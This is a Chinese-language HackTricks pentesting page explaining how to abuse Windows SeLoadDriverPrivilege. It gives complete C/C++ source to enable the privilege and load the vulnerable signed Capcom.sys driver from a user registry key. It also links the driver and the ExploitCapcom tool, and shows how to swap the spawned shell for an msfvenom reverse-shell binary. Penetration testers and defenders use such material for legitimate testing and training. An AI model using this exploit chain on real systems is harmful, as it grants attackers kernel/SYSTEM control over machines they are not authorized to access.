# 滥用 SeLoadDriverPrivilege

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？ 您想看到您的**公司在 HackTricks 中被宣传**吗？ 或者您想访问**PEASS 的最新版本或下载 HackTricks 的 PDF**吗？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) **Discord 群组**](https://discord.gg/hRep4RUj7f) 或 **电报群组** 或在 **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)** 上关注我**。
* **通过向[hacktricks 仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud)提交 PR 来分享您的黑客技巧**。

</details>

## SeLoadDriverPrivilege <a href="#seloaddriverprivilege" id="seloaddriverprivilege"></a>

将此特权分配给任何用户都非常危险 - 它允许用户加载内核驱动程序并以内核权限执行代码，也就是 `NT\System`。查看 `offense\spotless` 用户拥有此特权：

![](../../../.gitbook/assets/a8.png)

`Whoami /priv` 显示默认情况下该特权已禁用：

![](../../../.gitbook/assets/a9.png)

然而，下面的代码可以相当容易地启用该特权：

{% code title="privileges.cpp" %}
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

system("cmd");
return 0;
}
```
{% endcode %}

我们编译上述代码，执行后，权限`SeLoadDriverPrivilege`现在已启用：

![](../../../.gitbook/assets/a10.png)

### Capcom.sys 驱动程序漏洞利用 <a href="#capcom-sys-driver-exploit" id="capcom-sys-driver-exploit"></a>

为了进一步证明`SeLoadDriverPrivilege`的危险性，让我们**利用它来提升权限**。

您可以使用**NTLoadDriver**加载一个新的驱动程序：
```cpp
NTSTATUS NTLoadDriver(
_In_ PUNICODE_STRING DriverServiceName
);
```
默认情况下，驱动程序服务名称应位于`\Registry\Machine\System\CurrentControlSet\Services\`

但是，根据**文档**，您也可以使用**HKEY_CURRENT_USER**下的路径，因此您可以在那里**修改**一个**注册表**以在系统上**加载任意驱动程序**。\
必须在新注册表中定义的相关参数为：

- **ImagePath：** REG_EXPAND_SZ 类型值，指定驱动程序路径。在此上下文中，路径应为一个非特权用户具有修改权限的目录。
- **Type：** REG_WORD 类型值，指示服务类型。对于我们的目的，该值应定义为SERVICE_KERNEL_DRIVER（0x00000001）。

因此，您可以在**`\Registry\User\<User-SID>\System\CurrentControlSet\MyService`**中创建一个新注册表，在**ImagePath**中指定驱动程序的路径，在**Type**中使用值1，并在利用程序中使用这些值（您可以使用以下方法获取用户SID：`Get-ADUser -Identity 'USERNAME' | select SID` 或 `(New-Object System.Security.Principal.NTAccount("USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).value`）。
```bash
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
```
第一个声明一个字符串变量，指示受害系统上易受攻击的 **Capcom.sys** 驱动程序的位置，第二个是一个字符串变量，指示将要使用的服务名称（可以是任何服务）。\
请注意，**驱动程序必须由 Windows 签名**，因此您无法加载任意驱动程序。但是，**Capcom.sys** **可以被滥用以执行任意代码，并且由 Windows 签名**，因此目标是加载此驱动程序并利用它。

加载驱动程序：
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <stdlib.h>
#include <locale.h>
#include <iostream>
#include "stdafx.h"

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

int main()
{
TOKEN_PRIVILEGES tp;
LUID luid;
bool bEnablePrivilege(true);
HANDLE hToken(NULL);
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
L"SeLoadDriverPrivilege",   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("LookupPrivilegeValue error: %un", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;

if (bEnablePrivilege) {
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
}

// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("AdjustTokenPrivileges error: %x", GetLastError());
return FALSE;
}

//system("cmd");
// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
std::cout << "[+] Set Registry Keys" << std::endl;
NTSTATUS st1;
UNICODE_STRING pPath;
UNICODE_STRING pPathReg;
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
HMODULE hObsolete = GetModuleHandleA(NTDLL);
*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");

RtlInitUnicodeString(&pPath, pPathSource);
RtlInitUnicodeString(&pPathReg, pPathSourceReg);
st1 = NtLoadDriver(&pPathReg);
std::cout << "[+] value of st1: " << st1 << "\n";
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver Loaded as Kernel..\n";
std::cout << "[+] Press [ENTER] to unload driver\n";
}

getchar();
st1 = NtUnloadDriver(&pPathReg);
if (st1 == ERROR_SUCCESS) {
std::cout << "[+] Driver unloaded from Kernel..\n";
std::cout << "[+] Press [ENTER] to exit\n";
getchar();
}

return 0;
}
```
一旦上述代码被编译并执行，我们可以看到我们恶意的`Capcom.sys`驱动程序被加载到受害者系统上：

![](../../../.gitbook/assets/a11.png)

下载：[Capcom.sys - 10KB](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media\&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54)

**现在是时候滥用加载的驱动程序来执行任意代码了。**

您可以从[https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)和[https://github.com/zerosum0x0/puppetstrings](https://github.com/zerosum0x0/puppetstrings)下载利用程序，并在系统上执行以将我们的权限提升为`NT Authority\System`：

![](../../../.gitbook/assets/a12.png)

### 无 GUI

如果我们**无法访问目标的 GUI**，我们将不得不在编译之前修改**`ExploitCapcom.cpp`**代码。在这里，我们可以编辑第292行，将`C:\\Windows\\system32\\cmd.exe"`替换为，例如，使用`msfvenom`创建的反向 shell 二进制文件：`c:\ProgramData\revshell.exe`。
```c
// Launches a command shell process
static bool LaunchShell()
{
TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
PROCESS_INFORMATION ProcessInfo;
STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
&ProcessInfo))
{
return false;
}

CloseHandle(ProcessInfo.hThread);
CloseHandle(ProcessInfo.hProcess);
return true;
}
```
在这个例子中，`CommandLine` 字符串将被更改为：

代码：c
```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
### 自动

您可以使用[https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/)来**自动启用**特权，**创建**HKEY\_CURRENT\_USER下的注册表键，并**执行NTLoadDriver**指定要创建的注册表键和驱动程序路径：

![](<../../../.gitbook/assets/image (289).png>)

然后，您需要下载一个**Capcom.sys**漏洞利用程序，并使用它来提升特权。
